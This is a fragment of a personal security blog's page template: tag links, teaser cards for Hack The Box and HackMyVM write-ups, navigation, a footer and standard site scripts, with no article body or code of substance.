class="post-tag" href="/tags/programming/">programming</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/misc/">misc</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc"></nav></div><script src="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.js"></script></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5"><div id="related-posts" class="mb-2 mb-sm-4"><h3 class="pt-2 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/hmv-principle2/"><div class="card-body"> <em class="small" data-ts="1702857601" data-df="ll" > Dec 18, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack My VM - Principle 2</h3><div class="text-muted small"><p> HMV Principle 2 I was back to acting last beta tester for my friend Kaian. I have dedicated the last few days to solve Kaian’s last machine: Principle 2 for HackMyVM. I really, admire A LOT all t...</p></div></div></a></div><div class="card"> <a href="/posts/htb-nibbles/"><div class="card-body"> <em class="small" data-ts="1688342401" data-df="ll" > Jul 3, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the box - Nibbles</h3><div class="text-muted small"><p> Nibbles In this article we are going to assume the following IP addresses: Local machine (attacker, localhost): 10.0.0.1 Target machine (victim, Nibbles box): 10.0.0.2 As this is a ret...</p></div></div></a></div><div class="card"> <a href="/posts/htb-getting-started/"><div class="card-body"> <em class="small" data-ts="1688515201" data-df="ll" > Jul 5, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the box - Getting started</h3><div class="text-muted small"><p> Getting started In this article we are going to assume the folling ip addresses: Local machine (attacker, localhost): 10.0.0.1 Target machine (victim, Getting started box): 10.0.0.2 Th...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-getting-started/" class="btn btn-outline-primary" prompt="Older"><p>Hack the box - Getting started</p></a> <a href="/posts/customizing-default-directory-names-gnu-linux/" class="btn btn-outline-primary" prompt="Newer"><p>Customizing default directory names on GNU/Linux</p></a></div></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hack-the-box/">hack the box</a> <a class="post-tag" href="/tags/challenge/">challenge</a> <a class="post-tag" href="/tags/gnu-linux/">gnu/linux</a> <a class="post-tag" href="/tags/administration/">administration</a> <a class="post-tag" href="/tags/personal/">personal</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/hardening/">hardening</a> <a class="post-tag" href="/tags/programming/">programming</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/misc/">misc</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><footer><div class="container pl-lg-4 pr-lg-4"><div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://github.com/rubenhortas">Rubén Hortas</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0">Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></div></footer><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lazysizes@5.3.2/lazysizes.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/unregister.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-NJBDP43045"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-NJBDP43045'); }); </script>
